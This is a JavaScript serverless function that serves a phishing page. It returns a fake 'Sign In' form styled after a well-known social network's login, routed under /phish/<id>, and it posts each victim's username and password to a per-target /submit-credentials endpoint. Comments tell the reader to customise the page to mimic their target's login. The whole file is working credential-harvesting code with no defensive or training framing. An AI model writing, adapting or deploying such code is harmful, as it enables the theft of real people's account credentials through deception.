const { send } = require('micro');
const { parse } = require('url');

// This serverless function serves the fake login HTML page.
module.exports = async (req, res) => {
    // Extract the uniqueId from the URL path (e.g., /phish/abcdefg)
    const { pathname } = parse(req.url);
    const uniqueId = pathname.split('/').pop();

    // The HTML content for your fake login page.
    // CUSTOMIZE THIS to mimic the login page of your target!
    const fakeLoginPageHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; }
            .login-container { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); width: 300px; text-align: center; }
            h2 { margin-bottom: 20px; color: #1c1e21; }
            input[type="text"], input[type="password"] { width: calc(100% - 20px); padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            button:hover { background-color: #166fe5; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Sign In</h2> <!-- Customize title -->
            <form action="/submit-credentials/${uniqueId}" method="POST">
                <input type="text" name="username" placeholder="Email or Phone" required> <!-- Customize placeholder -->
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <p style="font-size: 12px; margin-top: 15px;"><a href="#" style="color: #1877f2; text-decoration: none;">Forgot password?</a></p>
        </div>
    </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    send(res, 200, fakeLoginPageHtml);
};
